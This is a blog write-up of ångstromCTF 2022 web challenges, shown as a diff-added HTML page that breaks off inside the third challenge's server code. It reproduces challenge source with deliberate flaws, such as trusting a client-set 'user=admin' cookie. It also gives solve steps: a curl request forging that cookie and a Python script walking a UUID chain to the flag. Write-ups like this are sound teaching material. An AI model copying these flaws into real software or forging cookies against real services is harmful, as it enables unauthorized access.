@@ -1,0 +1,430 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[ångstromCTF 2022] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="ångstromCTF 2022 was held at Sat, April 30, 00:00 — Wed, May 04, 23:59 (UTC). Since I mainly solved the web, I will write the writeup.
+[web] The Flash Problem Statement :
+The new Justice League movies nerfed the Flash, so clam made his own rendition! Can you get the flag before the Flash swaps it out at the speed of light? Problem Server : https://the-flash.web.actf.co/
+Basically, the dummy flag is displayed on the web page, but the real flag is displayed for a moment."><meta property="og:image" content><meta property="og:title" content="[ångstromCTF 2022] My own writeup"><meta property="og:description" content="ångstromCTF 2022 was held at Sat, April 30, 00:00 — Wed, May 04, 23:59 (UTC). Since I mainly solved the web, I will write the writeup.
+[web] The Flash Problem Statement :
+The new Justice League movies nerfed the Flash, so clam made his own rendition! Can you get the flag before the Flash swaps it out at the speed of light? Problem Server : https://the-flash.web.actf.co/
+Basically, the dummy flag is displayed on the web page, but the real flag is displayed for a moment."><meta property="og:type" content="article"><meta property="og:url" content="/posts/13/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-05T09:05:01+09:00"><meta property="article:modified_time" content="2022-05-05T09:05:01+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[ångstromCTF 2022] My own writeup"><meta name=twitter:description content="ångstromCTF 2022 was held at Sat, April 30, 00:00 — Wed, May 04, 23:59 (UTC). Since I mainly solved the web, I will write the writeup.
+[web] The Flash Problem Statement :
+The new Justice League movies nerfed the Flash, so clam made his own rendition! Can you get the flag before the Flash swaps it out at the speed of light? Problem Server : https://the-flash.web.actf.co/
+Basically, the dummy flag is displayed on the web page, but the real flag is displayed for a moment."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[ångstromCTF 2022] My own writeup</h1><div class=meta>Posted on May 5, 2022</div></div><nav id=TableOfContents><ol><li><a href=#web-the-flash>[web] The Flash</a></li><li><a href=#web-auth-skip>[web] Auth Skip</a></li><li><a href=#web-crumbs>[web] crumbs</a></li><li><a href=#web-xtra-salty-sardines>[web] Xtra Salty Sardines</a></li><li><a href=#web-art-gallery>[web] Art Gallery</a></li><li><a href=#web-no-flags>[web] No Flags?</a></li><li><a href=#thoughts>Thoughts</a></li></ol></nav><section class=body><p>ångstromCTF 2022 was held at Sat, April 30, 00:00 — Wed, May 04, 23:59 (UTC).
+Since I mainly solved the web, I will write the writeup.</p><h1 id=web-the-flash>[web] The Flash</h1><p>Problem Statement :</p><pre tabindex=0><code>The new Justice League movies nerfed the Flash, so clam made his own rendition! Can you get the flag before the Flash swaps it out at the speed of light?
+</code></pre><p>Problem Server : <a href=https://the-flash.web.actf.co/>https://the-flash.web.actf.co/</a></p><p>Basically, the dummy flag is displayed on the web page, but the real flag is displayed for a moment.
+I didn&rsquo;t have the idea of ​​detecting and stopping the change in the DOM, so I took a video of the screen and stopped it at a place like that.</p><p><img src=/images/posts/13/flash_flag.png alt=flag></p><h1 id=web-auth-skip>[web] Auth Skip</h1><p>Problem Statement :</p><pre tabindex=0><code>Clam was doing his angstromCTF flag% speedrun when he ran into the infamous timesink known in the speedrunning community as &#34;auth&#34;. Can you pull off the legendary auth skip and get the flag?
+</code></pre><p>Problem Server : <a href=https://auth-skip.web.actf.co/>https://auth-skip.web.actf.co/</a></p><p>Distributed files : <code>index.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:index.js data-lang=:index.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>path</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;path&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cookieParser</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;cookie-parser&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>port</span> <span style=color:#f92672>=</span> Number(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>PORT</span>) <span style=color:#f92672>||</span> <span style=color:#ae81ff>8080</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;actf{placeholder_flag}&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>urlencoded</span>({ <span style=color:#a6e22e>extended</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }));
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>cookieParser</span>());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/login&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#34;admin&#34;</span> <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>!==</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>()
+</span></span><span style=display:flex><span>    ) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;incorrect login&#34;</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>cookie</span>(<span style=color:#e6db74>&#34;user&#34;</span>, <span style=color:#e6db74>&#34;admin&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#34;/&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>cookies</span>.<span style=color:#a6e22e>user</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>port</span>, () =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server listening on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}</span><span style=color:#e6db74>.`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>From the following, it can be seen that the flag can be obtained by sending <code>user = admin</code> as a cookie.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>cookies</span>.<span style=color:#a6e22e>user</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>Send <code>user = admin</code> as a cookie to get the flag.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -H &#39;Cookie: user=admin;&#39; https://auth-skip.web.actf.co/ 
+actf{passwordless_authentication_is_the_new_hip_thing}
+</code></pre><h1 id=web-crumbs>[web] crumbs</h1><p>Problem Statement :　</p><pre tabindex=0><code>Follow the crumbs.
+</code></pre><p>Problem Server : <a href=https://crumbs.web.actf.co/>https://crumbs.web.actf.co/</a></p><p>Distributed files : <code>index.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:index.js data-lang=:index.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>crypto</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;crypto&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>port</span> <span style=color:#f92672>=</span> Number(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>PORT</span>) <span style=color:#f92672>||</span> <span style=color:#ae81ff>8080</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;actf{placeholder_flag}&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>paths</span> <span style=color:#f92672>=</span> {};
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>curr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomUUID</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>first</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>curr</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1000</span>; <span style=color:#f92672>++</span><span style=color:#a6e22e>i</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>curr</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomUUID</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>curr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>curr</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>curr</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;flag&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>urlencoded</span>({ <span style=color:#a6e22e>extended</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/:slug&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>slug</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;flag&#34;</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>slug</span>]) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>)
+</span></span><span style=display:flex><span>            .<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>)
+</span></span><span style=display:flex><span>            .<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Go to </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>slug</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Broke the trail of crumbs...&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Go to </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>first</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>port</span>, () =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server listening on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}</span><span style=color:#e6db74>.`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>If you look at <code>index.js</code>, you can see that it looks like this:</p><pre tabindex=0><code>paths[UUID1] = UUID2
+paths[UUID2] = UUID3
+...
+paths[UUID1000] = &#34;flag&#34;
+</code></pre><p>And from the following, it can be seen that a flag can be obtained by sending UUID1000 as a path parameter.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/:slug&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>slug</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;flag&#34;</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>slug</span>]) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>)
+</span></span><span style=display:flex><span>            .<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>)
+</span></span><span style=display:flex><span>            .<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Go to </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>paths</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>slug</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Broke the trail of crumbs...&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>If you GET <code>/</code>, you will get UUID1, so you can obediently ask for UUID2 or later and get the flag as follows.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:solve.py data-lang=:solve.py><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;https://crumbs.web.actf.co/&#34;</span>)
+</span></span><span style=display:flex><span>path <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>split()[<span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;https://crumbs.web.actf.co/&#34;</span><span style=color:#f92672>+</span>path)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#e6db74>&#34;actf{&#34;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text) <span style=color:#f92672>or</span> (r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>200</span>):
+</span></span><span style=display:flex><span>        print(r<span style=color:#f92672>.</span>text) <span style=color:#75715e># actf{w4ke_up_to_th3_m0on_6bdc10d7c6d5}</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>    path <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>split()[<span style=color:#ae81ff>2</span>]
+</span></span></code></pre></div><h1 id=web-xtra-salty-sardines>[web] Xtra Salty Sardines</h1><p>Problem Statement :</p><pre tabindex=0><code>Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, and then got a revolutionary new challenge idea. What if he wrote a site with an extremely suggestive acronym?
+</code></pre><p>Promblem Server : <a href=https://xtra-salty-sardines.web.actf.co>https://xtra-salty-sardines.web.actf.co</a>, <a href=https://admin-bot.actf.co/xtra-salty-sardines>https://admin-bot.actf.co/xtra-salty-sardines</a></p><p>Distributed Files : <code>index.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:index.js data-lang=:index.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>path</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;path&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;fs&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cookieParser</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;cookie-parser&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>port</span> <span style=color:#f92672>=</span> Number(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>PORT</span>) <span style=color:#f92672>||</span> <span style=color:#ae81ff>8080</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sardines</span> <span style=color:#f92672>=</span> {};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>alpha</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>secret</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>ADMIN_SECRET</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;secretpw&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;actf{placeholder_flag}&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>genId</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>ret</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>10</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ret</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>alpha</span>[Math.<span style=color:#a6e22e>floor</span>(Math.<span style=color:#a6e22e>random</span>() <span style=color:#f92672>*</span> <span style=color:#a6e22e>alpha</span>.<span style=color:#a6e22e>length</span>)];
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ret</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>urlencoded</span>({ <span style=color:#a6e22e>extended</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }));
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>cookieParser</span>());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// the admin bot will be able to access this
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>cookies</span>.<span style=color:#a6e22e>secret</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>secret</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;you can&#39;t view this &gt;:(&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/mksardine&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>name</span>) {
